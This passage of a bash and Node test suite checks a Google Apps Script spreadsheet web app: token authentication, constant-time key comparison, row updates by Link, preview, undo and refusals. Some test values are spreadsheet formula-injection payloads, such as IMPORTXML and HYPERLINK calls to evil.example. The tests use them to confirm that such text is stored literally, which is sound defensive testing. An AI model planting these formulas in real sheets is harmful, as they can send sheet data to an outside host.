  if (typeof v !== 'string') return v;
  if (v.startsWith("'")) return v.slice(1);
  const numeric = /^[+-]?\d+(\.\d+)?$/.test(v);
  if (/^[=+\-@]/.test(v) && !numeric) return { formula: v, value: '#FORMULA', display: '#FORMULA' };
  const m = v.match(/^(\d{4})-(\d{1,2})-(\d{1,2})$/);
  if (m) { const d = m[1] + '-' + m[2].padStart(2, '0') + '-' + m[3].padStart(2, '0'); return { date: d + 'T00:00:00.000Z', display: d }; }
  if (numeric) return Number(v);
  return v;
}
const formulaOf = (r, c) => { const v = raw(r, c); return v && typeof v === 'object' && v.formula ? v.formula : ''; };
function applyChange(ops) {
  ops.forEach((op) => {
    if (op.set) { const [r, c, v] = op.set; while (rows[r - 1].length < c) rows[r - 1].push(''); rows[r - 1][c - 1] = v; }
    else if (op.swap) { const [a, b] = op.swap; const t = rows[a - 1]; rows[a - 1] = rows[b - 1]; rows[b - 1] = t; }
    else if (op.insertColumn) { const [c, name] = op.insertColumn; rows.forEach((r, i) => r.splice(c - 1, 0, i === 0 ? name : '')); }
    else throw new Error('unknown fixture change ' + JSON.stringify(op));
  });
}
function range(r, c, nr, nc) {
  nr = nr === undefined ? 1 : nr; nc = nc === undefined ? 1 : nc;
  if (!(r >= 1 && c >= 1 && nr >= 1 && nc >= 1)) throw new Error('bad range ' + [r, c, nr, nc]);
  const grid = (read) => {
    reads++;
    const out = [];
    for (let i = 0; i < nr; i++) { const row = []; for (let j = 0; j < nc; j++) row.push(read(r + i, c + j)); out.push(row); }
    if (nr > 1 && !mutated && fx.afterBulkRead) { applyChange(fx.afterBulkRead); mutated = true; }
    return out;
  };
  return {
    getValues() { return grid(cell); },
    getDisplayValues() { return grid(shown); },
    getFormulas() { return grid(formulaOf); },
    setValue(v) {
      if (nr !== 1 || nc !== 1) throw new Error('setValue on a range of more than one cell');
      while (rows.length < r) rows.push([]);
      while (rows[r - 1].length < c) rows[r - 1].push('');
      rows[r - 1][c - 1] = stored(v);
      writes.push([r, c, v]);
    },
    setValues(vals) {
      vals.forEach((row, i) => row.forEach((v, j) => { range(r + i, c + j).setValue(v); }));
    },
  };
}
const sheet = {
  getLastColumn: () => width(),
  getLastRow: () => rows.length,
  getRange: range,
  getDataRange: () => range(1, 1, Math.max(rows.length, 1), Math.max(width(), 1)),
  appendRow: (r) => { appended.push(r); rows.push(r.map(stored)); },
};
const ctx = {
  SpreadsheetApp: { getActiveSpreadsheet: () => ({ getSheets: () => [sheet], getSheetByName: () => sheet }), flush: () => {} },
  LockService: { getScriptLock: () => ({
    tryLock: () => { if (lock.busy) return false; lock.taken++; return true; },
    waitLock: () => { if (lock.busy) throw new Error('Lock timeout'); lock.taken++; },
    releaseLock: () => { lock.released++; },
    hasLock: () => lock.taken > lock.released,
  }) },
  ContentService: { MimeType: { JSON: 'json' }, createTextOutput: (s) => ({ setMimeType: () => s }) },
  Utilities: { formatDate: () => '2026-01-01' },
  Session: { getScriptTimeZone: () => 'UTC' },
  JSON,
};
vm.createContext(ctx);
// Counts character reads inside the script, to judge whether the key comparison does the same
// work wherever a wrong key first differs (L19).
let charReads = 0;
const proto = vm.runInContext('String.prototype', ctx);
const realCharCodeAt = proto.charCodeAt;
proto.charCodeAt = function (i) { charReads++; return realCharCodeAt.call(this, i); };
vm.runInContext(code, ctx);
const snapshot = () => rows.map((r) => r.slice());
function diff(a, b) {
  const out = [];
  for (let r = 0; r < Math.max(a.length, b.length); r++) {
    const ra = a[r] || [], rb = b[r] || [];
    for (let c = 0; c < Math.max(ra.length, rb.length); c++) {
      const va = c < ra.length ? ra[c] : '', vb = c < rb.length ? rb[c] : '';
      if (va !== vb) out.push([r + 1, c + 1, va, vb]);
    }
  }
  return out;
}
const parsed = JSON.parse(requestJson);
const requests = Array.isArray(parsed) ? parsed : [parsed];
const responses = [], diffs = [];
requests.forEach((req) => {
  const before = snapshot();
  const out = method === 'GET'
    ? ctx.doGet({ parameter: req })
    : ctx.doPost({ postData: { contents: typeof req === 'string' ? req : JSON.stringify(req) } });
  responses.push(JSON.parse(out));
  diffs.push(diff(before, rows));
});
console.log(JSON.stringify({ response: responses[responses.length - 1], appended: appended.length, charReads: charReads,
  responses, diffs, writes, reads, mutated, lock, rows }));
JS
  GS="$DIR/apps-script.gs"
  # Built from parts so this file never holds a token shaped run of its own.
  REAL="abcdefghijklmnop""0123456789ABCDEFGHIJKLMN"
  gs(){ node "$TMP/gs-harness.js" "$GS" "$1" "$2" "${3:-POST}" "${4:--}" 2>&1; }
  # jget <harness output> <python expression over d>: one field of the harness's report, as
  # compact JSON. Prints HARNESS-UNREADABLE when the output was not the harness's JSON, so a
  # crash is never read as an empty field.
  jget(){ python3 -c 'import json,sys
try:
    d=json.loads(sys.argv[1])
except ValueError:
    print("HARNESS-UNREADABLE: %r" % sys.argv[1][:300]); sys.exit(0)
print(json.dumps(eval(sys.argv[2]), separators=(",",":")))' "$1" "$2" 2>&1; }

  r="$(gs "$REAL" "{\"key\":\"$REAL\",\"action\":\"headers\"}")"
  check "web app, real token: the right key asks for the headers" '"ok":true,"headers":["Project Name","Date Started"]' "$r"
  check "and appends nothing" '"appended":0' "$r"
  r="$(gs "$REAL" "{\"key\":\"$REAL\",\"data\":{\"Project Name\":\"x\"}}")"
  check "web app, real token: the right key appends a row" '"ok":true' "$r"
  check "exactly one" '"appended":1' "$r"
  for case in "wrong key|{\"key\":\"nope\",\"data\":{\"a\":1}}" \
              "no key|{\"data\":{\"a\":1}}" \
              "the right value under the first version's field name|{\"token\":\"$REAL\",\"data\":{\"a\":1}}" \
              "the placeholder as the key|{\"key\":\"$GS_TOKEN\",\"data\":{\"a\":1}}"; do
    r="$(gs "$REAL" "${case#*|}")"
    check "web app, real token, ${case%%|*}: refused as a bad token" '"error":"bad token"' "$r"
    check "web app, real token, ${case%%|*}: appends nothing" '"appended":0' "$r"
  done
  # Near misses a broken constant time comparison would let through.
  for near in "a prefix of the key|${REAL%?}" "the key plus one character|${REAL}x" \
              "the key with its last character changed|${REAL%?}Z" "an empty key|"; do
    r="$(gs "$REAL" "{\"key\":\"${near#*|}\",\"data\":{\"a\":1}}")"
    check "web app, real token, ${near%%|*}: refused" '"error":"bad token"' "$r"
    check "web app, real token, ${near%%|*}: appends nothing" '"appended":0' "$r"
  done
  # Constant time (L19): a wrong key differing at its FIRST character costs the comparison as
  # many character reads as one differing at its LAST, and every character is read.
  reads(){ sed -n 's/.*"charReads":\([0-9]*\).*/\1/p' <<< "$1"; }
  wrong_first="Z${REAL:1}"; wrong_last="${REAL:0:${#REAL}-1}Z"
  r_first="$(gs "$REAL" "{\"key\":\"$wrong_first\",\"action\":\"headers\"}")"
  r_last="$(gs "$REAL" "{\"key\":\"$wrong_last\",\"action\":\"headers\"}")"
  check "web app: the key wrong at its first character is refused as a bad token" '"error":"bad token"' "$r_first"
  check "web app: the key wrong at its last character is refused as a bad token" '"error":"bad token"' "$r_last"
  first="$(reads "$r_first")"; last="$(reads "$r_last")"
  check_eq "web app: a key wrong at its first character costs the same reads as one wrong at its last" "$first" "$last"
  if [ -n "$first" ] && [ "$first" -ge "${#REAL}" ]; then ok; else bad "web app: the comparison reads every character of the key (read $first of ${#REAL})"; fi
  r="$(gs "$REAL" "{\"key\":\"$REAL\"}")"
  check "web app: the right key with neither action nor data is refused" '"ok":false' "$r"
  check "and appends nothing, never an empty dated row" '"appended":0' "$r"
  r="$(gs "$REAL" "{\"token\":\"$REAL\"}" GET)"
  check "web app: a GET is refused even with the right token in its address" '"ok":false' "$r"
  check_not "and reveals no headers" "Project Name" "$(jget "$r" 'd["response"]')"

  # Fails closed: the shipped placeholder, or a token too short to be real, refuses everything,
  # including a caller that sends that very placeholder as its key.
  for tok in "-|the shipped placeholder" "short0123|a short token"; do
    t="${tok%%|*}"; key="$t"; [ "$t" = "-" ] && key="$GS_TOKEN"
    r="$(gs "$t" "{\"key\":\"$key\",\"action\":\"headers\"}")"
    check "web app with ${tok#*|} as TOKEN: refuses even the matching key" '"error":"token not set' "$r"
    check_not "and reveals no headers" "Project Name" "$(jget "$r" 'd["response"]')"
    r="$(gs "$t" "{\"key\":\"$key\",\"data\":{\"a\":1}}")"
    check "web app with ${tok#*|} as TOKEN: refuses an append" '"ok":false' "$r"
    check "and appends nothing" '"appended":0' "$r"
  done

  # --- update: one row changed in place, found by its Link (claude-config#1031) ---
  # The sheet as Dan has it, plus a column nobody's code knows about (Notes), a row with an empty
  # Date Completed that must stay empty (append dates empty date columns; update must not), and a
  # ragged row with no Link at all. Fixtures and bodies are built by python, never by hand quoting.
  python3 - "$TMP" <<'PY'
import json, os, sys
tmp = sys.argv[1]
H = ["Project Name", "Date Started", "Date Completed", "Problem/Goal", "My Actions",
     "Outcome/Results", "When to Check Results", "Skills Used", "Link", "Notes"]
rows = [H,
  ["Alpha", "2026-01-05", "", "Goal A", "Did A", "Out A", "2026-11-01", "TypeScript", "https://github.com/example/alpha", "note a"],
  ["Beta", "2026-02-01", "2026-03-01", "Goal B", "Did B", "Out B", "", "Python", "https://github.com/example/beta", "note b"],
  ["Gamma", "2026-03-01", "", "Goal G", "Did G"],
  ["Delta", "2026-04-01", "", "Goal D", "Did D", "Out D", "2026-12-01", "Go", "https://github.com/example/delta", ""]]
def fixture(name, **extra):
    d = {"rows": rows}; d.update(extra)
    json.dump(d, open(os.path.join(tmp, name + ".json"), "w"))
fixture("sheet")
dup = [r[:] for r in rows]; dup[4][8] = "https://github.com/example/alpha"
json.dump({"rows": dup}, open(os.path.join(tmp, "sheet-dup.json"), "w"))
fixture("sheet-renamed", afterBulkRead=[{"set": [2, 1, "Alpha renamed"]}])
fixture("sheet-sorted", afterBulkRead=[{"swap": [2, 3]}])
fixture("sheet-relinked", afterBulkRead=[{"set": [2, 9, "https://github.com/example/other"]}])
fixture("sheet-column", afterBulkRead=[{"insertColumn": [10, "Inserted"]}])
fixture("sheet-locked", lockBusy=True)
# A row whose cells hold what the sheet really holds: a date (getValues gives a Date, which
# serializes as a timestamp nobody typed) and a formula (getValues gives its result).
typed = [r[:] for r in rows] + [["Zeta", "2026-06-01", "", "Goal Z", "Did Z", "Out Z",
  {"date": "2026-11-01T04:00:00.000Z", "display": "2026-11-01"},
  {"formula": "=CONCAT(\"Type\",\"Script\")", "value": "TypeScript", "display": "TypeScript"},
  "https://github.com/example/zeta", ""]]
json.dump({"rows": typed}, open(os.path.join(tmp, "sheet-typed.json"), "w"))
PY
  SHEET="$TMP/sheet.json"
  ALPHA="https://github.com/example/alpha"
  # upd <key> <link> <project name> <data json>: an update body, printed as JSON.
  upd(){ python3 -c 'import json,sys; print(json.dumps({"key":sys.argv[1],"action":"update","link":sys.argv[2],"projectName":sys.argv[3],"cells":json.loads(sys.argv[4])}))' "$@"; }
  # unchanged <harness output>: yes when every cell of the sheet still holds the fixture's value.
  unchanged(){ python3 -c 'import json,sys
d=json.loads(sys.argv[1]); f=json.load(open(sys.argv[2]))["rows"]
pad=lambda r,n: r+[""]*(n-len(r))
w=max(len(r) for r in f)
print("yes" if [pad(r,w) for r in d["rows"]]==[pad(r,w) for r in f] else "no: %s" % d["diffs"])' "$1" "$SHEET" 2>&1; }

  # Every refusal: named, and the sheet untouched, not one cell written. Defined before any
  # case uses it: a call to a function not yet defined prints "command not found" and counts
  # nothing, so its cases would pass by never running.
  refuses_update(){ # refuses_update <description> <expected words in the error> <harness output>
    check "update, $1: refused" '"ok":false' "$(jget "$3" 'd["response"]')"
    check "update, $1: says why" "$2" "$(jget "$3" 'd["response"].get("error")')"
    check_eq "update, $1: writes no cell" '[]' "$(jget "$3" 'd["writes"]')"
    check_eq "update, $1: appends no row" '0' "$(jget "$3" 'd["appended"]')"
  }

  # Append a row, then update it by its Link: exactly the named cells change.
  APPEND_E="$(python3 -c 'import json,sys; print(json.dumps({"key":sys.argv[1],"data":{"Project Name":"Epsilon","Date Started":"2026-05-01","Date Completed":"","Problem/Goal":"Goal E","My Actions":"Did E","Outcome/Results":"Out E","When to Check Results":"2026-12-15","Skills Used":"Bash","Link":"https://github.com/example/epsilon","Notes":"keep me"}}))' "$REAL")"
  UPDATE_E="$(upd "$REAL" "https://github.com/example/epsilon" "Epsilon" '{"My Actions":"Did E and more","outcome/results":"Shipped"}')"
  r="$(gs "$REAL" "[$APPEND_E,$UPDATE_E]" POST "$SHEET")"
  check_eq "update: the appended row lands first" 'true' "$(jget "$r" 'd["responses"][0]["ok"]')"
  check_eq "update: the update by Link succeeds" 'true' "$(jget "$r" 'd["responses"][1]["ok"]')"
  check_eq "and names the row it changed" '6' "$(jget "$r" 'd["responses"][1]["rowNumber"]')"
  check_eq "and changes exactly the two named cells, matching a header in any case" \
    '[[6,5,"Did E","Did E and more"],[6,6,"Out E","Shipped"]]' "$(jget "$r" 'd["diffs"][1]')"
  check_eq "and writes no other cell at all, not even with its own value, and each as literal text" \
    "[[6,5,\"'Did E and more\"],[6,6,\"'Shipped\"]]" "$(jget "$r" 'd["writes"]')"
  check_eq "and every unlisted column keeps its value (empty Date Completed stays empty, When to Check Results and Notes kept)" \
    '["Epsilon","2026-05-01","","Goal E","Did E and more","Shipped","2026-12-15","Bash","https://github.com/example/epsilon","keep me"]' \
    "$(jget "$r" 'd["rows"][5]')"
  check_eq "and every other row is as it was" "yes" "$(unchanged "$(python3 -c 'import json,sys; d=json.loads(sys.argv[1]); d["rows"]=d["rows"][:5]; print(json.dumps(d))' "$r")")"
  check_eq "and the answer carries what the changed cells held before, for an undo" \
    '{"My Actions":"Did E","Outcome/Results":"Out E"}' "$(jget "$r" 'd["responses"][1]["before"]')"
  # The double was reached (L143): the script read the sheet and took and gave back its lock.
  check_eq "and the update took the script lock once and released it" '{"taken":1,"released":1,"busy":false}' "$(jget "$r" 'd["lock"]')"

  # "before" is what an undo writes back, so it must be what a person would type to restore the
  # cell: a date as the sheet shows it, never a timestamp, and a formula as its formula, never
  # its result, which would freeze it.
  r="$(gs "$REAL" "$(upd "$REAL" "https://github.com/example/zeta" "Zeta" '{"When to Check Results":"2027-01-01","Skills Used":"Go"}')" POST "$TMP/sheet-typed.json")"
  check_eq "update: a date cell's before is the date as shown, and a formula cell's before is its formula" \
    '{"When to Check Results":"2026-11-01","Skills Used":"=CONCAT(\"Type\",\"Script\")"}' "$(jget "$r" 'd["responses"][0]["before"]')"
  check_eq "and the answer's row is the row as the sheet shows it after the write" \
    '["Zeta","2026-06-01","","Goal Z","Did Z","Out Z","2027-01-01","Go","https://github.com/example/zeta",""]' "$(jget "$r" 'd["responses"][0]["row"]')"

  # preview: the same lookup and checks, the current values of the named cells, and no write,
  # so the old and new values can be shown for approval before anything changes.
  prev(){ python3 -c 'import json,sys; b=json.loads(sys.argv[1]); b["preview"]=True; print(json.dumps(b))' "$(upd "$@")"; }
  r="$(gs "$REAL" "$(prev "$REAL" "https://github.com/example/zeta" "Zeta" '{"When to Check Results":"2027-01-01","My Actions":"x"}')" POST "$TMP/sheet-typed.json")"
  check_eq "update preview: succeeds, marked a preview" '[true,"update",true,6]' \
    "$(jget "$r" '[d["response"].get("ok"), d["response"].get("action"), d["response"].get("preview"), d["response"].get("rowNumber")]')"
  check_eq "and gives the named cells' current values" '{"When to Check Results":"2026-11-01","My Actions":"Did Z"}' "$(jget "$r" 'd["response"]["before"]')"
  check_eq "and writes no cell" '[]' "$(jget "$r" 'd["writes"]')"
  refuses_update_preview(){ # the preview refuses exactly where the update would
    check "update preview, $1: refused" '"ok":false' "$(jget "$3" 'd["response"]')"
    check "update preview, $1: says why" "$2" "$(jget "$3" 'd["response"].get("error")')"
    check_eq "update preview, $1: writes no cell" '[]' "$(jget "$3" 'd["writes"]')"
  }
  refuses_update_preview "Beta's Link sent with Alpha's Project Name" 'has Project Name \"Beta\", not \"Alpha\"' \
    "$(gs "$REAL" "$(prev "$REAL" "https://github.com/example/beta" "Alpha" '{"My Actions":"x"}')" POST "$SHEET")"
  refuses_update_preview "a header the sheet does not have" "Not A Column" \
    "$(gs "$REAL" "$(prev "$REAL" "$ALPHA" "Alpha" '{"Not A Column":"y"}')" POST "$SHEET")"
  refuses_update_preview "a wrong key" "bad token" "$(gs "$REAL" "$(prev "nope" "$ALPHA" "Alpha" '{"My Actions":"x"}')" POST "$SHEET")"

  # expect: what the preview showed. The update writes only while every named cell still holds
  # it, so a cell edited after the preview was approved is never overwritten unseen.
  withexp(){ python3 -c 'import json,sys; b=json.loads(sys.argv[1]); b["expect"]=json.loads(sys.argv[2]); print(json.dumps(b))' "$1" "$2"; }
  r="$(gs "$REAL" "$(withexp "$(upd "$REAL" "https://github.com/example/zeta" "Zeta" '{"When to Check Results":"2027-01-01","Skills Used":"Go"}')" \
    '{"When to Check Results":"2026-11-01","skills used":"=CONCAT(\"Type\",\"Script\")"}')" POST "$TMP/sheet-typed.json")"
  check_eq "update with expect matching what the preview read: writes both cells" "[[6,7,\"'2027-01-01\"],[6,8,\"'Go\"]]" "$(jget "$r" 'd["writes"]')"

  # Cells are written as literal text by default (#1047 review): #1032 writes text made from
  # commit subjects, and a subject starting = + - or @ would otherwise become a live formula
  # (formula injection, IMPORTXML style exfiltration), and date or number shaped text would be
  # converted. Each stays exactly the text sent, as stored and as shown.
  HOSTILE='{"My Actions":"=IMPORTXML(\"https://evil.example/\",\"//a\")","Outcome/Results":"2026-1-5","Skills Used":"+SUM(1)","Notes":"@here -x"}'
  r="$(gs "$REAL" "$(upd "$REAL" "$ALPHA" "Alpha" "$HOSTILE")" POST "$SHEET")"
  check_eq "update: formula, date and sign led text is stored as the literal text sent, never a formula, date or number" \
    '["=IMPORTXML(\"https://evil.example/\",\"//a\")","2026-1-5","+SUM(1)","@here -x"]' "$(jget "$r" '[d["rows"][1][i] for i in (4,5,7,9)]')"
  check_eq "and shown exactly as sent" \
    '["=IMPORTXML(\"https://evil.example/\",\"//a\")","2026-1-5","+SUM(1)","@here -x"]' "$(jget "$r" '[d["response"]["row"][i] for i in (4,5,7,9)]')"
  # append had the same exposure: every text value it is given is literal too.
  r="$(gs "$REAL" "$(python3 -c 'import json,sys; print(json.dumps({"key":sys.argv[1],"data":{"Project Name":"=HYPERLINK(\"https://evil.example\",\"x\")","Date Started":"2026-1-5","Date Completed":"","Problem/Goal":"-1+2","Skills Used":"0042","Link":"@x","When to Check Results":42}}))' "$REAL")" POST "$SHEET")"
  check_eq "append: formula, date, sign and number shaped text is stored as the literal text sent; a JSON number stays a number" \
    '["=HYPERLINK(\"https://evil.example\",\"x\")","2026-1-5","","-1+2",42,"0042","@x"]' "$(jget "$r" '[d["rows"][-1][i] for i in (0,1,2,3,6,7,8)]')"
  check_eq "and the answer's row is the row as the sheet shows it, never the escaped values sent" \
    '["=HYPERLINK(\"https://evil.example\",\"x\")","2026-1-5","","-1+2","42","0042","@x"]' "$(jget "$r" '[d["response"]["row"][i] for i in (0,1,2,3,6,7,8)]')"
  # A date column left empty is filled with today, and as literal text like every caller's date,
  # so one column never mixes real dates with text dates.
  r="$(gs "$REAL" "$(python3 -c 'import json,sys; print(json.dumps({"key":sys.argv[1],"data":{"Project Name":"Theta","Date Started":"2026-05-01"}}))' "$REAL")" POST "$SHEET")"
  check_eq "append: an empty date column is filled with today as literal text, the same kind as a date sent" \
    '["2026-05-01","2026-01-01"]' "$(jget "$r" '[d["rows"][-1][1], d["rows"][-1][2]]')"

  # restore: the one raw write, for an undo. It puts back exactly what the answer's "restore"
  # recorded (a formula as a live formula, a date as a date, text as text), and only together with
  # expect covering every cell it writes, so it can only overwrite the values it is undoing.
  FIRST="$(upd "$REAL" "https://github.com/example/zeta" "Zeta" '{"When to Check Results":"2027-01-01","Skills Used":"Go","My Actions":"=1+1 typed"}')"
  UNDO="$(python3 -c 'import json,sys; print(json.dumps({"key":sys.argv[1],"action":"update","link":"https://github.com/example/zeta","projectName":"Zeta","restore":True,
    "cells":{"When to Check Results":{"date":"2026-11-01"},"Skills Used":{"formula":"=CONCAT(\"Type\",\"Script\")"},"My Actions":"Did Z"},
    "expect":{"When to Check Results":"2027-01-01","Skills Used":"Go","My Actions":"=1+1 typed"}}))' "$REAL")"
  r="$(gs "$REAL" "[$FIRST,$UNDO]" POST "$TMP/sheet-typed.json")"
  check_eq "update: the answer's restore holds what puts each cell back (a formula and a date marked as such, text as text)" \
    '{"When to Check Results":{"date":"2026-11-01"},"Skills Used":{"formula":"=CONCAT(\"Type\",\"Script\")"},"My Actions":"Did Z"}' "$(jget "$r" 'd["responses"][0].get("restore")')"
  check_eq "and restoring it succeeds" 'true' "$(jget "$r" 'd["responses"][1].get("ok")')"
  check_eq "and puts back a live formula, a date and plain text" \
    '[{"formula":"=CONCAT(\"Type\",\"Script\")"},"2026-11-01","Did Z"]' \
    "$(jget "$r" '[{"formula": d["rows"][5][7].get("formula")} if isinstance(d["rows"][5][7], dict) else d["rows"][5][7], d["rows"][5][6].get("display") if isinstance(d["rows"][5][6], dict) and "date" in d["rows"][5][6] else d["rows"][5][6], d["rows"][5][4]]')"
  # Text stays literal even under restore: only a value marked {"formula"} or {"date"} is raw.
  r="$(gs "$REAL" "$(python3 -c 'import json,sys; print(json.dumps({"key":sys.argv[1],"action":"update","link":"https://github.com/example/alpha","projectName":"Alpha","restore":True,"cells":{"My Actions":"=IMPORTXML(\"https://evil.example/\",\"//a\")"},"expect":{"My Actions":"Did A"}}))' "$REAL")" POST "$SHEET")"
  check_eq "update: restore still writes plain text as literal text" '"=IMPORTXML(\"https://evil.example/\",\"//a\")"' "$(jget "$r" 'd["rows"][1][4]')"
  refuses_update "a formula or date value without restore" "restore" \
    "$(gs "$REAL" "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":{"formula":"=1+1"}}')" POST "$SHEET")"
  refuses_update "a formula value that is not a formula" "My Actions" \
    "$(gs "$REAL" "$(python3 -c 'import json,sys; b=json.loads(sys.argv[1]); b["restore"]=True; b["expect"]={"My Actions":"Did A"}; print(json.dumps(b))' "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":{"formula":"1+1"}}')")" POST "$SHEET")"
  refuses_update "restore without expect" "restore" \
    "$(gs "$REAL" "$(python3 -c 'import json,sys; b=json.loads(sys.argv[1]); b["restore"]=True; print(json.dumps(b))' "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"=1+1"}')")" POST "$SHEET")"
  refuses_update "restore whose expect leaves out a cell it writes" "Outcome/Results" \
    "$(gs "$REAL" "$(python3 -c 'import json,sys; b=json.loads(sys.argv[1]); b["restore"]=True; b["expect"]={"My Actions":"Did A"}; print(json.dumps(b))' "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"=1+1","Outcome/Results":"=2+2"}')")" POST "$SHEET")"
  refuses_update "restore that is not true or false" "restore" \
    "$(gs "$REAL" "$(python3 -c 'import json,sys; b=json.loads(sys.argv[1]); b["restore"]="yes"; b["expect"]={"My Actions":"Did A"}; print(json.dumps(b))' "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"=1+1"}')")" POST "$SHEET")"
  refuses_update "restore over a cell edited since" 'now holds \"Did A\"' \
    "$(gs "$REAL" "$(python3 -c 'import json,sys; b=json.loads(sys.argv[1]); b["restore"]=True; b["expect"]={"My Actions":"something else"}; print(json.dumps(b))' "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"=1+1"}')")" POST "$SHEET")"
  refuses_update "a named cell edited since the preview" 'now holds \"Did A\", not \"Did A earlier\"' \
    "$(gs "$REAL" "$(withexp "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"x","Outcome/Results":"y"}')" '{"My Actions":"Did A earlier","Outcome/Results":"Out A"}')" POST "$SHEET")"
  refuses_update "expect naming a cell the update does not change" "Notes" \
    "$(gs "$REAL" "$(withexp "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"x"}')" '{"Notes":"note a"}')" POST "$SHEET")"
  refuses_update "expect that is not an object" "expect" \
    "$(gs "$REAL" "$(withexp "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"x"}')" '["Did A"]')" POST "$SHEET")"

  # An existing row, found among others, carrying a column after Link.
  r="$(gs "$REAL" "$(upd "$REAL" "https://github.com/example/beta" "Beta" '{"Notes":"note b2"}')" POST "$SHEET")"
  check_eq "update: an existing row's cell after Link changes, and only it" '[[3,10,"note b","note b2"]]' "$(jget "$r" 'd["diffs"][0]')"

  refuses_update "a Link no row holds" "no row" "$(gs "$REAL" "$(upd "$REAL" "https://github.com/example/nope" "Alpha" '{"My Actions":"x"}')" POST "$SHEET")"
  # The message names what the row really holds, never "the sheet changed", which would send
  # somebody to re-read a sheet that did not move (L11).
  refuses_update "Beta's Link sent with Alpha's Project Name" 'has Project Name \"Beta\", not \"Alpha\"' "$(gs "$REAL" "$(upd "$REAL" "https://github.com/example/beta" "Alpha" '{"My Actions":"x"}')" POST "$SHEET")"
  refuses_update "a Link two rows hold" "more than one row" "$(gs "$REAL" "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"x"}')" POST "$TMP/sheet-dup.json")"
  refuses_update "a header the sheet does not have" "Not A Column" "$(gs "$REAL" "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"x","Not A Column":"y"}')" POST "$SHEET")"
  refuses_update "no cells to change" "nothing to update" "$(gs "$REAL" "$(upd "$REAL" "$ALPHA" "Alpha" '{}')" POST "$SHEET")"
  refuses_update "one header named twice in different case" "more than once" "$(gs "$REAL" "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"x","my actions":"y"}')" POST "$SHEET")"
  refuses_update "a value that is not text, a number or true or false" "My Actions" "$(gs "$REAL" "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":{"nested":1}}')" POST "$SHEET")"
  refuses_update "an empty Link" "link" "$(gs "$REAL" "$(upd "$REAL" "" "Alpha" '{"My Actions":"x"}')" POST "$SHEET")"
  refuses_update "an empty Project Name" "projectName" "$(gs "$REAL" "$(upd "$REAL" "$ALPHA" "" '{"My Actions":"x"}')" POST "$SHEET")"
  r="$(gs "$REAL" "$(python3 -c 'import json,sys; print(json.dumps({"key":sys.argv[1],"action":"update","link":"https://github.com/example/alpha","cells":{"My Actions":"x"}}))' "$REAL")" POST "$SHEET")"
  refuses_update "no Project Name at all" "projectName" "$r"
  r="$(gs "$REAL" "$(python3 -c 'import json,sys; print(json.dumps({"key":sys.argv[1],"action":"update","link":"https://github.com/example/alpha","projectName":"Alpha","data":{"My Actions":"x"}}))' "$REAL")" POST "$SHEET")"
  refuses_update "its cells sent as data, the append field" "cells" "$r"
  check_eq "update: a successful answer names itself an update, so a caller can tell it from an append's" '"update"' \
    "$(jget "$(gs "$REAL" "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"x"}')" POST "$SHEET")" 'd["response"].get("action")')"
  refuses_update "another run holding the lock" "busy" "$(gs "$REAL" "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"x"}')" POST "$TMP/sheet-locked.json")"

  # The token guards update exactly as it guards append, and is judged before the sheet is read.
  for case in "a wrong key|nope|bad token" "no key|-|bad token" "the placeholder as the key|$GS_TOKEN|bad token"; do
    IFS='|' read -r what key why <<< "$case"
    body="$(upd "$key" "$ALPHA" "Alpha" '{"My Actions":"x"}')"
    [ "$key" = "-" ] && body="$(python3 -c 'import json,sys; b=json.loads(sys.argv[1]); del b["key"]; print(json.dumps(b))' "$body")"
    r="$(gs "$REAL" "$body" POST "$SHEET")"
    refuses_update "$what" "$why" "$r"
    check_eq "update, $what: never reads the sheet" '0' "$(jget "$r" 'd["reads"]')"
  done
  r="$(gs "-" "$(upd "$GS_TOKEN" "$ALPHA" "Alpha" '{"My Actions":"x"}')" POST "$SHEET")"
  refuses_update "with the shipped placeholder as TOKEN" "token not set" "$r"

  # Re-verified straight before the write: the sheet changed after the script found the row.
  # Each fixture's change fires on the script's first read of more than one row, and "mutated"
  # proves it did fire, so a refusal here is the re-check's and not a missed lookup (L143).
  for case in "sheet-renamed|its Project Name changed after it was found" \
              "sheet-sorted|the sheet was sorted after it was found" \
              "sheet-relinked|its Link changed after it was found"; do
    r="$(gs "$REAL" "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"x"}')" POST "$TMP/${case%%|*}.json")"
    check_eq "update, ${case#*|}: the change to the sheet did happen" 'true' "$(jget "$r" 'd["mutated"]')"
    refuses_update "${case#*|}" "changed" "$r"
  done
  r="$(gs "$REAL" "$(upd "$REAL" "$ALPHA" "Alpha" '{"Notes":"x"}')" POST "$TMP/sheet-column.json")"
  check_eq "update, a column inserted after it was found: the change to the sheet did happen" 'true' "$(jget "$r" 'd["mutated"]')"
  refuses_update "a column inserted after it was found, moving the target column" "changed" "$r"
  check_eq "and the lock is given back after a refusal too" '{"taken":1,"released":1,"busy":false}' "$(jget "$r" 'd["lock"]')"

  # An action the script does not know is refused, never read as an append.
  r="$(gs "$REAL" "{\"key\":\"$REAL\",\"action\":\"updat\",\"data\":{\"Project Name\":\"x\"}}")"
  check "web app: an unknown action is refused" '"ok":false' "$(jget "$r" 'd["response"]')"
  check "and named" "updat" "$(jget "$r" 'd["response"].get("error")')"
  check_eq "and appends nothing" '0' "$(jget "$r" 'd["appended"]')"
fi

echo
echo "passed: $pass, failed: $fail"
echo "SUITE-RESULT passed=$pass failed=$fail"
[ "$fail" -eq 0 ]
